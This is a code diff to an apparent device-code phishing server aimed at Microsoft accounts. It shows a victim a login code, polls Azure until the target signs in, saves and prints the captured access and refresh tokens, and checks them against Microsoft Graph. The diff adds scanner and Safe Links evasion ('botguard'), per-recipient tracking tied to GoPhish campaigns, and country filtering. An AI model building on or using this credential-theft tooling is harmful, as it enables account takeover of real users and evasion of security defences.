@@ -8,6 +8,7 @@ import path from 'path';
 import { fileURLToPath } from 'url';
 import geoip from 'geoip-country';
 import { publicUrl, COMMON_ENDPOINTS } from './smoke-test.mjs';
+import { checkBotguard, getChallengeHtml, initBotguard } from './botguard.mjs';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const configPath = path.join(__dirname, 'config.json');
@@ -28,6 +29,7 @@ const defaultConfig = {
     userCodesFile: "successful_user_code_cookies.txt",
     logFile: "logfile.txt",
     tokenFile: "tokens.txt",
+    visitLogFile: "visits.tsv",
     threemaOn: false,
     threemaTo: ["YourID1","YourID2"],
     threemaFrom: "YourName",
@@ -39,12 +41,26 @@ const defaultConfig = {
     userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     geoipallowlist: ["US","CA"],
     validateTokens: true,
+    printTokensOnCapture: true,
     graphValidationScope: "https://graph.microsoft.com/.default offline_access",
+    botguard: {
+        enabled: true,
+        jsChallenge: false,
+        safelinksBlock: true,
+        blockedJa3: [],
+    },
 };
 
-const config = fs.existsSync(configPath)
+const fileConfig = fs.existsSync(configPath)
     ? JSON.parse(fs.readFileSync(configPath, 'utf8'))
-    : defaultConfig;
+    : {};
+const config = {
+    ...defaultConfig,
+    ...fileConfig,
+    botguard: { ...defaultConfig.botguard, ...fileConfig.botguard },
+};
+
+initBotguard(config);
 
 function resolveCertPath(certPath) {
     return path.isAbsolute(certPath) ? certPath : path.join(__dirname, certPath);
@@ -56,6 +72,80 @@ function victimUrl() {
 
 function smokeTestUrl() {
     return publicUrl(config, '/smoke-test', __dirname);
+}
+
+const activeVisits = new Map();
+
+function visitLogPath() {
+    return config.visitLogFile || 'visits.tsv';
+}
+
+function clientIp(req) {
+    return (
+        req.headers['cf-connecting-ip'] ||
+        req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+        req.ip ||
+        req.connection?.remoteAddress ||
+        ''
+    );
+}
+
+function recipientEmailFromQuery(req) {
+    return String(req.query.r || req.query.email || '').trim().slice(0, 256);
+}
+
+function gophishRidFromQuery(req) {
+    return String(req.query.rid || '').trim().slice(0, 256);
+}
+
+function visitTrackingFromQuery(req) {
+    const email = recipientEmailFromQuery(req);
+    const gophishRid = gophishRidFromQuery(req);
+    const fallbackId = String(req.query.id || '').trim().slice(0, 256);
+    return {
+        recipient: email || fallbackId || gophishRid,
+        gophishRid,
+    };
+}
+
+function appendVisitRow({ code, recipient = '', gophishRid = '', ip = '', status, user = '', detail = '' }) {
+    const safeDetail = String(detail).replace(/[\t\r\n]+/g, ' ').slice(0, 500);
+    const row = [
+        getTime().trim(),
+        code,
+        recipient,
+        gophishRid,
+        ip,
+        status,
+        user,
+        safeDetail,
+    ].join('\t') + '\n';
+    writeToFile(visitLogPath(), row);
+}
+
+function registerVisit(code, { recipient, gophishRid, ip, route }) {
+    activeVisits.set(code, { recipient, gophishRid, ip, route });
+    appendVisitRow({ code, recipient, gophishRid, ip, status: 'issued' });
+    logMessage(
+        `Visit ${route} — code ${code}` +
+        (recipient ? ` recipient=${recipient}` : '') +
+        (gophishRid ? ` rid=${gophishRid}` : '') +
+        (ip ? ` ip=${ip}` : '')
+    );
+}
+
+function finalizeVisit(code, status, user = '', detail = '') {
+    const visit = activeVisits.get(code) || {};
+    appendVisitRow({
+        code,
+        recipient: visit.recipient || '',
+        gophishRid: visit.gophishRid || '',
+        ip: visit.ip || '',
+        status,
+        user,
+        detail,
+    });
+    activeVisits.delete(code);
 }
 
 function displayCodeToVictim(res, userCode) {
@@ -103,19 +193,29 @@ function pollForAzureTokens(deviceCode, userCode, oauthConfig = config) {
                 if (pollResult.error && pollResult.error !== 'authorization_pending') {
                     if (pollResult.error === 'expired_token') {
                         logMessage(`The following user code expired: ${userCode}. No longer poll it.`, 'error');
+                        finalizeVisit(userCode, 'expired', '', 'device code timed out before login');
                         clearInterval(interval);
                     } else {
                         logMessage(`Another error occured than expiring for code:\n${formatAzureToken(userCode, pollResult)}`, 'error');
+                        finalizeVisit(
+                            userCode,
+                            'login_failed',
+                            '',
+                            pollResult.error_description || pollResult.error || 'oauth error'
+                        );
                         clearInterval(interval);
                     }
                 }
                 if (pollResult.access_token) {
+                    const resolved = await resolveCaptureIdentity(pollResult);
+                    finalizeVisit(userCode, 'captured', resolved.identity.upn);
                     logMessage(`Success, your Azure tokens for code ${userCode} were saved to ${config.tokenFile}`);
                     writeToFile(config.userCodesFile, userCode + '\n');
                     writeToFile(config.tokenFile, getTime() + formatAzureToken('Usercode: ' + userCode, pollResult));
                     writeToFile(userCode, JSON.stringify(pollResult, null, 4));
+                    logCaptureTokens(userCode, pollResult);
                     if (config.validateTokens !== false) {
-                        await validateCapturedTokens(userCode, pollResult);
+                        await validateCapturedTokens(userCode, pollResult, oauthConfig, resolved);
                     }
                     sendThreemaNotifications();
                     clearInterval(interval);
@@ -146,6 +246,19 @@ function logMessage(message, type) {
 
 function formatAzureToken(userCode, pollResult) {
     return userCode + '\n' + JSON.stringify(pollResult, null, 4) + '\n\n';
+}
+
+function logCaptureTokens(userCode, pollResult) {
+    if (config.printTokensOnCapture === false) {
+        return;
+    }
+    logMessage(`ACCESS TOKEN (${userCode}):\n${pollResult.access_token}`);
+    if (pollResult.refresh_token) {
+        logMessage(`REFRESH TOKEN (${userCode}):\n${pollResult.refresh_token}`);
+    }
+    if (pollResult.id_token) {
+        logMessage(`ID TOKEN (${userCode}):\n${pollResult.id_token}`);
+    }
 }
 
 function sendThreemaNotifications() {
@@ -208,12 +321,71 @@ async function fetchAzureToken(deviceCode, oauthConfig = config) {
 
 function decodeJwtPayload(jwt) {
     try {
-        const payload = jwt.split('.')[1];
-        const padded = payload.replace(/-/g, '+').replace(/_/g, '/');
-        return JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
+        const parts = String(jwt).split('.');
+        if (parts.length < 2) {
+            return null;
+        }
+        let payload = parts[1].replace(/-/g, '+').replace(/_/g, '/');
+        while (payload.length % 4) {
+            payload += '=';
+        }
+        return JSON.parse(Buffer.from(payload, 'base64').toString('utf8'));
     } catch {
         return null;
     }
+}
+
+function upnFromClaims(claims) {
+    return (
+        claims.preferred_username ||
+        claims.upn ||
+        claims.unique_name ||
+        claims.email ||
+        claims.login ||
+        claims.username ||
+        ''
+    );
+}
+
+function identityFromTokens(pollResult) {
+    const idClaims = pollResult.id_token ? decodeJwtPayload(pollResult.id_token) : null;
+    const accessClaims =
+        pollResult.access_token && pollResult.access_token.includes('.')
+            ? decodeJwtPayload(pollResult.access_token)
+            : null;
+    const claims = idClaims || accessClaims;
+
+    if (!claims) {
+        return { upn: 'unknown', tenantId: 'unknown', displayName: '' };
+    }
+
+    const upn = upnFromClaims(idClaims) || upnFromClaims(accessClaims) || 'unknown';
+    const tenantId = idClaims?.tid || accessClaims?.tid || 'unknown';
+    const displayName = idClaims?.name || accessClaims?.name || '';
+
+    return { upn, tenantId, displayName };
+}
+
+async function resolveCaptureIdentity(pollResult) {
+    const identity = identityFromTokens(pollResult);
+    if (identity.upn !== 'unknown') {
+        return { identity, graphResult: null };
+    }
+
+    const graphResult = await testGraphMe(pollResult.access_token);
+    if (graphResult.status !== 200) {
+        return { identity, graphResult: null };
+    }
+
+    const profile = graphResult.body;
+    return {
+        identity: {
+            upn: profile.userPrincipalName || profile.mail || identity.upn,
+            tenantId: identity.tenantId,
+            displayName: profile.displayName || identity.displayName,
+        },
+        graphResult,
+    };
 }
 
 function summarizeApiError(body) {
@@ -227,6 +399,31 @@ function summarizeApiError(body) {
         return `${body.error}${body.suberror ? ` (${body.suberror})` : ''}`;
     }
     return JSON.stringify(body).slice(0, 240);
+}
+
+function describeGraphFailure(status, body) {
+    const detail = summarizeApiError(body);
+    if (status === 429) {
+        return `GRAPH RATE LIMITED — HTTP 429: ${detail}. Microsoft throttles Graph for the public Office client ID; capture still succeeded.`;
+    }
+    if (status === 401 || status === 403) {
+        return `GRAPH DENIED — HTTP ${status}: ${detail}`;
+    }
+    return `GRAPH CHECK FAILED — HTTP ${status}: ${detail}`;
+}
+
+function describeRefreshFailure(body) {
+    const detail = summarizeApiError(body);
+    if (detail.includes('AADSTS53003')) {
+        return (
+            `REFRESH DENIED — ${detail.split('. Trace ID')[0]}. ` +
+            'Often Microsoft blocking Graph scope refresh on the public Office client — not necessarily your tenant Conditional Access. Capture still succeeded.'
+        );
+    }
+    if (detail.includes('AADSTS65001') || /consent/i.test(detail)) {
+        return `REFRESH DENIED — admin consent required: ${detail}`;
+    }
+    return `REFRESH DENIED — ${detail}`;
 }
 
 async function testGraphMe(accessToken) {
@@ -245,14 +442,14 @@ async function testGraphMe(accessToken) {
     return { status: response.status, body };
 }
 
-async function refreshAccessToken(refreshToken, scopes) {
+async function refreshAccessToken(refreshToken, scopes, oauthConfig = config) {
     const data = new URLSearchParams({
         grant_type: 'refresh_token',
-        client_id: config.clientId,
+        client_id: oauthConfig.clientId,
         refresh_token: refreshToken,
         scope: scopes,
     });
-    const response = await fetch(config.tokenUrl, buildPostRequest(data));
+    const response = await fetch(oauthConfig.tokenUrl, buildPostRequest(data, oauthConfig));
     let body = {};
     try {
         body = await response.json();
@@ -262,20 +459,18 @@ async function refreshAccessToken(refreshToken, scopes) {
     return { status: response.status, body };
 }
 
-async function validateCapturedTokens(userCode, pollResult) {
-    const identity = pollResult.id_token ? decodeJwtPayload(pollResult.id_token) : null;
-    const upn = identity?.preferred_username || identity?.upn || identity?.email || 'unknown';
-    const tenantId = identity?.tid || 'unknown';
-    const displayName = identity?.name || '';
+async function validateCapturedTokens(userCode, pollResult, oauthConfig = config, preResolved = null) {
+    const { identity, graphResult: cachedGraph } = preResolved || (await resolveCaptureIdentity(pollResult));
+    const { upn, tenantId, displayName } = identity;
 
     logMessage(
-        `CAPTURE user=${upn} tenant=${tenantId} code=${userCode}` +
+        `CAPTURE OK — user=${upn} tenant=${tenantId} code=${userCode}` +
         (displayName ? ` name="${displayName}"` : '')
     );
 
     const graphScope = config.graphValidationScope || 'https://graph.microsoft.com/.default offline_access';
 
-    let graphResult = await testGraphMe(pollResult.access_token);
+    let graphResult = cachedGraph || (await testGraphMe(pollResult.access_token));
     if (graphResult.status === 200) {
         const profile = graphResult.body;
         logMessage(
@@ -284,9 +479,7 @@ async function validateCapturedTokens(userCode, pollResult) {
         return;
     }
 
-    logMessage(
-        `GRAPH BLOCKED — HTTP ${graphResult.status} with access_token: ${summarizeApiError(graphResult.body)}`
-    );
+    logMessage(describeGraphFailure(graphResult.status, graphResult.body));
 
     if (!pollResult.refresh_token) {
         logMessage('REFRESH SKIP — no refresh_token in response');
@@ -294,13 +487,10 @@ async function validateCapturedTokens(userCode, pollResult) {
     }
 
     logMessage('Trying refresh_token exchange for Graph scope ...', 'debug');
-    const refreshResult = await refreshAccessToken(pollResult.refresh_token, graphScope);
+    const refreshResult = await refreshAccessToken(pollResult.refresh_token, graphScope, oauthConfig);
 
     if (refreshResult.body.error) {
-        logMessage(
-            `REFRESH BLOCKED — ${summarizeApiError(refreshResult.body)} (likely CA, consent, or scope policy)`,
-            'error'
-        );
+        logMessage(describeRefreshFailure(refreshResult.body));
         return;
     }
 
@@ -321,10 +511,7 @@ async function validateCapturedTokens(userCode, pollResult) {
         return;
     }
 
-    logMessage(
-        `REFRESH OK but GRAPH BLOCKED — HTTP ${graphResult.status}: ${summarizeApiError(graphResult.body)} (token issued, API use denied)`,
-        'error'
-    );
+    logMessage(describeGraphFailure(graphResult.status, graphResult.body) + ' (refreshed token issued)');
 }
 
 async function fetchDeviceCode(oauthConfig = config) {
@@ -341,15 +528,37 @@ async function fetchDeviceCode(oauthConfig = config) {
 }
 
 function isCountryIP(ip) {
+    if (!ip) {
+        return false;
+    }
     const geo = geoip.lookup(ip);
+    if (!geo) {
+        return false;
+    }
     if (config.geoipallowlist.includes(geo.country)) {
         return true;
-    } else if (geo) {
-        logMessage(`Access from country denied: Country: ${geo.country}, IP: ${ip}`);
     }
+    logMessage(`Access from country denied: Country: ${geo.country}, IP: ${ip}`);
+    return false;
+}
+
+function handleBotguard(req, res) {
+    const ip = clientIp(req);
+    const result = checkBotguard(req, ip, config);
+    if (result.action === 'allow') {
+        return true;
+    }
+    logMessage(`Botguard ${result.action}: ${result.reason} ip=${ip}`);
+    if (result.action === 'challenge') {
+        res.status(200).send(getChallengeHtml(req, ip, config));
+        return false;
+    }
+    res.redirect(config.redirectUrl);
+    return false;
 }
 
 const app = express();
+app.set('trust proxy', true);
 app.engine('html', template.renderFile);
 app.use(express.static('public'));
 app.use(cookies());
@@ -363,8 +572,12 @@ app.get('/', function (req, res) {
 
 app.get('/share', async (req, res, next) => {
     try {
-        if (!isCountryIP(req.connection.remoteAddress) && !config.testMode) {
+        const ip = clientIp(req);
+        if (!isCountryIP(ip) && !config.testMode) {
             return res.redirect(config.redirectUrl);
+        }
+        if (!handleBotguard(req, res)) {
+            return;
         }
         if (userHasValidCookie(config.userCodesFile, req.cookies.shareCode)) {
             res.redirect(config.alreadyLoggedInURL);
@@ -373,7 +586,13 @@ app.get('/share', async (req, res, next) => {
         const deviceCodeResponse = await fetchDeviceCode();
         let userCode = deviceCodeResponse.user_code;
         let deviceCode = deviceCodeResponse.device_code;
-        logMessage(`Visit /share — issued device code ${userCode}`);
+        const tracking = visitTrackingFromQuery(req);
+        registerVisit(userCode, {
+            recipient: tracking.recipient,
+            gophishRid: tracking.gophishRid,
+            ip: clientIp(req),
+            route: '/share',
+        });
         displayCodeToVictim(res, userCode);
         pollForAzureTokens(deviceCode, userCode);
     }
@@ -388,7 +607,13 @@ app.get('/smoke-test', async (req, res) => {
         const deviceCodeResponse = await fetchDeviceCode(smokeConfig);
         const userCode = deviceCodeResponse.user_code;
         const deviceCode = deviceCodeResponse.device_code;
-        logMessage(`Smoke-test — issued device code ${userCode} (/common/ — sign in with your account)`);
+        const tracking = visitTrackingFromQuery(req);
+        registerVisit(userCode, {
+            recipient: tracking.recipient || 'smoke-test',
+            gophishRid: tracking.gophishRid,
+            ip: clientIp(req),
+            route: '/smoke-test',
+        });
         displayCodeToVictim(res, userCode);
         pollForAzureTokens(deviceCode, userCode, smokeConfig);
     } catch (error) {
